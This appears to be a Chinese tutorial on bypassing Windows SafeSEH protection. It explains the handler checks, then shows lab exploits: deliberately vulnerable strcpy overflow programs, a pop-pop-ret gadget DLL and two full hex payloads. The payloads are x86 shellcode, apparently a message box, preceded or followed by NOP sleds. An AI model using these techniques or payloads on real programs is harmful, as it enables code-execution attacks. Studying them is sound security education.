@@ -1,0 +1,332 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>通过前面的学习，我们了解到了GS保护机制的绕过方法，其中有一种攻击SEH异常处理的方法，可以说是与通常栈溢出没什么区别，只不过是覆盖的地址不一样，既然攻击SEH这么容易，我们能够想得到，那么开发工程师肯定也想的到，于是出现了SafeSEH保护机制：</p>
+<h1 data-content="1" id="41dae5a34cf01ae5087bc49ca6dac151">一.SafeSEH保护机制概述</h1>
+<p>我们知道通常情况下，异常处理机制都是系统帮我们写好，编译进程序里面的，那我们如何对这些异常处理地址进行保护呢？我们想想是不是可以像前面的GS那样，我们在另一个地方保存，然后在调用异常处理的时候进行验证呢？实际上是可以的，这张表我们称之为安全SEH表。<br/>
+当程序开启了SafeSEH保护后，在编译期间，编译器将所有的异常处理地址提取出来，并且编入一张安全SEH表中，并且将这张表放到程序的映像里面。当程序调用异常处理函数的时候，将会将函数地址与安全SEH表进行匹配，检查调用的异常处理函数是否位于安全SEH表中。<br/>
+但是这里要注意：SafeSEH实现需要操作系统和编译器的双重支持，二者缺一都会降低SafeSEH的保护能力！</p>
+<ul>
+<li>那我们来看看操作系统在SafeSEH机制中发挥的作用：<br/>
+我们知道异常处理函数的调用是通过<code>RtlDispatchException()</code>函数处理实现的，SafeSEH机制也是从这里开始的。</li>
+</ul>
+<p>操作系统在SafeSEH机制中发挥的作用：</p>
+<ol>
+<li>检查异常处理链是否位于当前程序栈中，如果不在当前栈中，将终止异常处理函数的调用。</li>
+<li>检查异常处理函数指针是否位于当前程序栈中，如果指向当前栈中，程序将终止异常处理函数的调用。</li>
+<li>在通过前两项检查之后，将通过一个全新的函数<code>RtlIsValidHandler()</code>函数来对异常处理函数的有效性进行验证。</li>
+</ol>
+<p>那么作为全新的安全校验函数，<code>RtlIsValidHandler()</code>函数到底做了哪些工作呢？我们就来详细看看：</p>
+<pre><code>1.首先，检查异常处理函数地址是否位于当前加载模块的内存空间，如果位于当前模块的加载空间，进行下一步检验
+2.判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识，如果设置了这个标识，这个程序内的异常将会被忽略，函数直接返回失败，如果没有设置这个标识，将进行下一步检验
+3.检测程序中是否含有安全S.E.H表，如果包含安全S.E.H表，则将当前异常处理函数地址与该表的表项进行匹配
+4.判断异常处理函数地址是否位于不可执行页上，如果位于不可执行页上，将会检测DEP是否开启，如果未开启，还将判断程序是否允许跳转到加载模块外执行</code></pre>
+<h1 data-content="1" id="83614bad345fca059d2628b86ac29302">二.绕过方式分析</h1>
+<p>通过以上的分析，是不是感觉SafeSEH机制对SEH的保护非常完善？实际上看似非常完善，但是总还是有机可乘的，我们就来分析分析那些情况允许异常处理函数执行：</p>
+<ol>
+<li>异常处理函数位于加载模块之外，且未开启DEP</li>
+<li>异常处理函数位于加载模块之内，相应模块没有开启SafeSEH，且相应模块不是IL</li>
+<li>异常处理函数位于加载模块之内，相应模块启用SafeSEH，该异常处理函数指针位于安全S.E.H表中</li>
+<li>我们再来分析一下这几种情况的可行性：<br/>
+第一种，位于加载模块之外，这里实际上我们只需要加载模块之外的很短的几条指令就可以，通过跳板跳到我们的shellcode执行，即可完成功能。<br/>
+第二种，我们可以使用没有开启SafeSEH的模块内的指令作为跳板，然后就可以跳转到我们的shellcode执行，也不是一件很困难的事情。<br/>
+第三种，对于与安全SEH表的检验我们可以有两种方式：一种是清空安全SEH表，造成未启用SafeSEH保护机制的假象，骗过操作系统去执行shellcode，另一种就是将我们的跳板注册到安全SEH表中（但是这种方式比较麻烦，而且安全SEH表是加密存放的，我们突破的可能性不是很大，暂时不考虑）<br/>
+这些方法都可以突破SafeSEH，但是我们有没有更简单的突破方法呢？答案是有的：</li>
+<li>不攻击SEH，我们可以考虑其他漏洞去攻击</li>
+<li>利用SEH的终极特权：SafeSEH有一个很大的漏洞：就是如果异常处理指针指向堆区，无论检验是否通过，都将执行。</li>
+</ol>
+<h1 data-content="1" id="91d186b928a7837b184a14478ed6a5be">三.SafeSEH保护机制的绕过</h1>
+<p>既然我们已经对SafeSEH保护机制非常了解了，那我们就来尝试突破一下：<br/>
+这里我们只研究SafeSEH保护机制，为了不受其他保护机制影响，我们将其他保护机制关闭，具体如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183158-1aa39466-d3c9-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183203-1df00d84-d3c9-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183207-204a50c6-d3c9-1.png"/></p>
+<h2 data-content="1" id="2251be6b3bff1e966396c9ab0946dc42">1.通过攻击返回地址来突破SafeSEH</h2>
+<p>这种方式就是通过非常普通的栈溢出，即使开启了GS，我们在上一篇文章中也学习过了，我们可以轻松绕过GS来劫持程序执行流程。这种方式的详细介绍在上一篇文章中。</p>
+<h2 data-content="1" id="b7a54145cfaa4d2bb40dbe0e0686105e">2.利用虚函数突破SafeSEH</h2>
+<p>通过上一节的学习，我们知道C++的虚函数也可以是我们攻击的对象，而且比较容易，上一篇讲过了，这里就不赘述了，这种方式的详细介绍在上一篇文章中。</p>
+<h2 data-content="1" id="60d5b695cabea7f6fb6836e9d3b46344">3.从堆中绕过SafeSEH</h2>
+<p>参考链接：<a href="https://www.cnblogs.com/zhang293/p/8996064.html" target="_blank">https://www.cnblogs.com/zhang293/p/8996064.html</a><br/>
+从这种方法开始，才可以说是我们真正地攻击SafeSEH了。还记得SafeSEH终极特权吗？就是如果异常处理函数指针位于堆区，即使验证不通过，也会执行，那我们就来尝试一下将我们的shellcode写到堆区进行执行：</p>
+<div class="highlight"><pre><span></span><span class="cp">#define _CRT_SECURE_NO_WARNINGS</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">test</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">szBuffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">200</span><span class="p">]{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">szBuffer</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">/</span> <span class="n">a</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+    <span class="n">_asm</span> <span class="kt">int</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
+        <span class="s">"G:</span><span class="se">\\</span><span class="s">漏洞原理</span><span class="se">\\</span><span class="s">SafeSEH</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">111.txt"</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+    <span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">dwReadSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">MyPayload</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">MyPayload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
+    <span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">MyPayload</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReadSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">test</span><span class="p">(</span><span class="n">MyPayload</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>我们来观察一下这个程序：在主函数中会使用int3触发一个断电，这里用于我们附加到调试器（因为在调试状态下和非调试状态下堆区的状态不同），然后读取文件，调用test函数，在test函数中存在一个明显的溢出。然后使用除零异常来调用异常处理。<br/>
+test函数中，缓冲区的起始地址：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183234-30133e00-d3c9-1.png"/></p>
+<p>堆中缓冲区的起始地址：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183244-35d67690-d3c9-1.png"/></p>
+<p>异常处理地址：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183253-3b5af73a-d3c9-1.png"/></p>
+<p>我们现在只需要将缓冲区溢出到距离最近的异常处理地址，就可以执行我们的shellcode。<br/>
+设计payload：</p>
+<table>
+<thead>
+<tr>
+<th>shellcode</th>
+<th>填充指令(\x90)</th>
+<th>堆中payload的起始地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>payload：</p>
+<pre><code>//------------------------------------------------------------
+//-----------       Created with 010 Editor        -----------
+//------         www.sweetscape.com/010editor/          ------
+//
+// File    : G:\漏洞原理\SafeSEH\Debug\111.txt
+// Address : 0 (0x0)
+// Size    : 408 (0x198)
+//------------------------------------------------------------
+unsigned char hexData[408] = {
+    0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31,
+    0xD2, 0xB2, 0x77, 0x31, 0xC9, 0x64, 0x8B, 0x71,
+    0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B,
+    0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38,
+    0x4F, 0x18, 0x75, 0xF3, 0x59, 0x01, 0xD1, 0xFF,
+    0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45,
+    0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B,
+    0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 0xE3,
+    0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31,
+    0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74,
+    0x07, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xEB, 0xF4,
+    0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A,
+    0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
+    0x5A, 0x1C, 0x01, 0xEB, 0x8B, 0x04, 0x8B, 0x01,
+    0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2,
+    0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68,
+    0x8E, 0x4E, 0x0E, 0xEC, 0x52, 0xE8, 0x9F, 0xFF,
+    0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0x7E, 0xD8,
+    0xE2, 0x73, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E,
+    0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x08, 0x68, 0x6C,
+    0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64,
+    0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88,
+    0x5C, 0x24, 0x0A, 0x89, 0xE6, 0x56, 0xFF, 0x55,
+    0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D,
+    0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF,
+    0xFF, 0xFF, 0x68, 0x6F, 0x78, 0x58, 0x20, 0x68,
+    0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73,
+    0x73, 0x31, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89,
+    0xE3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x57,
+    0x64, 0x49, 0x67, 0x31, 0xC9, 0x88, 0x4C, 0x24,
+    0x04, 0x89, 0xE1, 0x31, 0xD2, 0x52, 0x53, 0x51,
+    0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55,
+    0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0xA0, 0x79, 0x68, 0x00 
+};</code></pre>
+<p>这样我们就可以利用SafeSEH保护机制在堆区有特权的特性，即可执行shellcode。</p>
+<h2 data-content="1" id="de664f66337e9e22fc3466a5b50089f1">4.利用未启用SafeSEH的模块突破SafeSEH</h2>
+<p>大家回想一下前面我们讲过的SafeSEH的校验，如果说异常处理不在本模块中怎么办？如果说该模块未启用SafeSEH，就可以执行。<br/>
+那我们新的攻击思路就出来了：我们可以将异常处理指针指向一个未启用SafeSEH的模块，在这个模块中找一些指令，作为跳板地址，是不是就可以跳转到我们的ShellCode上执行？<br/>
+我们来详细看看这中突破方法：<br/>
+首先，我们需要一个未启用SafeSEH的模块，这里我们创建一个动态链接库，让程序调用：</p>
+<div class="highlight"><pre><span></span><span class="c1">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span>
+<span class="cp">#include</span> <span class="cpf">"pch.h"</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">jump</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kr">__asm</span> <span class="p">{</span>
+        <span class="n">pop</span> <span class="n">eax</span>
+        <span class="n">pop</span> <span class="n">eax</span>
+        <span class="n">retn</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
+                       <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
+                       <span class="n">LPVOID</span> <span class="n">lpReserved</span>
+                     <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>然后我们编写存在漏洞的程序：</p>
+<div class="highlight"><pre><span></span><span class="cp">#define _CRT_SECURE_NO_WARNINGS</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+
+<span class="kt">char</span> <span class="n">MyPayload</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>
+
+<span class="n">DWORD</span> <span class="nf">MyException</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"This is My exception!"</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">test</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">szBuffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">200</span><span class="p">]{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">szBuffer</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kr">__try</span> <span class="p">{</span>
+        <span class="n">zero</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">/</span> <span class="n">zero</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kr">__except</span> <span class="p">(</span><span class="n">MyException</span><span class="p">())</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="n">HANDLE</span> <span class="n">Handle</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"G:</span><span class="se">\\</span><span class="s">漏洞原理</span><span class="se">\\</span><span class="s">SafeSEH</span><span class="se">\\</span><span class="s">Dll1</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">Dll1.dll"</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">200</span><span class="p">]{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="kr">__asm</span> <span class="kt">int</span> <span class="mi">3</span><span class="p">;</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">MyPayload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
+        <span class="s">"G:</span><span class="se">\\</span><span class="s">漏洞原理</span><span class="se">\\</span><span class="s">SafeSEH</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">111.txt"</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+    <span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">dwReadSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">MyPayload</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReadSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">test</span><span class="p">(</span><span class="n">MyPayload</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以看到这里的test函数存在明显的栈溢出漏洞，可以覆盖SEH异常处理指针，那我们就来调试一下程序，写出payload：<br/>
+动态链接库中我们写好的跳板指令：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183310-4562febc-d3c9-1.png"/></p>
+<p><code>strcpy</code>函数参数：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183319-4af0026c-d3c9-1.png"/></p>
+<p>test函数中，str缓冲区的地址：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183325-4ec32e8c-d3c9-1.png"/></p>
+<p>SEH链：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183334-53bcccae-d3c9-1.png"/></p>
+<p>距离栈顶最近的SEH处理地址：<code>0x0019FE80</code>，距离我们的缓冲区<code>0x19FE80-0x19fdb0 = 208</code>。<br/>
+我们在208 ~ 212偏移处写上我们的跳板指令地址<code>0x560c15ee</code>，为了保证ShellCode不被破环，我们在后面再跟8个字节nop，然后后面跟上我们的ShellCode。<br/>
+Pyaload：</p>
+<pre><code>//------------------------------------------------------------
+//-----------       Created with 010 Editor        -----------
+//------         www.sweetscape.com/010editor/          ------
+//
+// File    : G:\漏洞原理\SafeSEH\Debug\111.txt
+// Address : 0 (0x0)
+// Size    : 481 (0x1E1)
+//------------------------------------------------------------
+unsigned char hexData[481] = {
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 0xEE, 0x15, 0x0C, 0x56,
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31,
+    0xD2, 0xB2, 0x77, 0x31, 0xC9, 0x64, 0x8B, 0x71,
+    0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B,
+    0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38,
+    0x4F, 0x18, 0x75, 0xF3, 0x59, 0x01, 0xD1, 0xFF,
+    0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45,
+    0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B,
+    0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 0xE3,
+    0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31,
+    0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74,
+    0x07, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xEB, 0xF4,
+    0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A,
+    0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
+    0x5A, 0x1C, 0x01, 0xEB, 0x8B, 0x04, 0x8B, 0x01,
+    0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2,
+    0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68,
+    0x8E, 0x4E, 0x0E, 0xEC, 0x52, 0xE8, 0x9F, 0xFF,
+    0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0x7E, 0xD8,
+    0xE2, 0x73, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E,
+    0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x08, 0x68, 0x6C,
+    0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64,
+    0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88,
+    0x5C, 0x24, 0x0A, 0x89, 0xE6, 0x56, 0xFF, 0x55,
+    0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D,
+    0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF,
+    0xFF, 0xFF, 0x68, 0x6F, 0x78, 0x58, 0x20, 0x68,
+    0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73,
+    0x73, 0x31, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89,
+    0xE3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x57,
+    0x64, 0x49, 0x67, 0x31, 0xC9, 0x88, 0x4C, 0x24,
+    0x04, 0x89, 0xE1, 0x31, 0xD2, 0x52, 0x53, 0x51,
+    0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55,
+    0x08 
+};</code></pre>
+<p>我们来调试观察一下：<br/>
+可以观察到已经跳转到我们的跳板指令上执行</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183344-5a24ee96-d3c9-1.png"/></p>
+<p>然后可以看到成功跳转到我们的4个nop上执行，紧接着后面就是我们的ShellCdoe：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183351-5e569406-d3c9-1.png"/></p>
+<h2 data-content="1" id="c33e9d06eba5bfa074e81dc434fbd368">5.利用加载模块之外的地址突破SafeSEH</h2>
+<p>我们知道在进程加载的时候，不仅只加载自生PE文件，而且会加载其他很多东西，比如DLL等，在这之中，就有被SafeSEH无视的部分：类型为Map的映射文件，也就是说当异常处理指针指向这里面的地址的时候，SafeSEH保护机制无效（即不做验证）。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240225183400-638b7edc-d3c9-1.png"/></p>
+<p>就是如图所示的这些类型为Map的映射文件，SafeSEH。<br/>
+那既然这样，我们可不可以在Map类型的映射文件中寻找跳板指令（俗称gadgets），然后跳转到我们的ShellCode上执行呢？<br/>
+答案是可以的，这种攻击方式与上面的利用未启用SafeSEH的模块突破SafeSEH的方式很类似，都是寻找跳板指令，这里不再做过多赘述。</p>
+</div>
+</div>
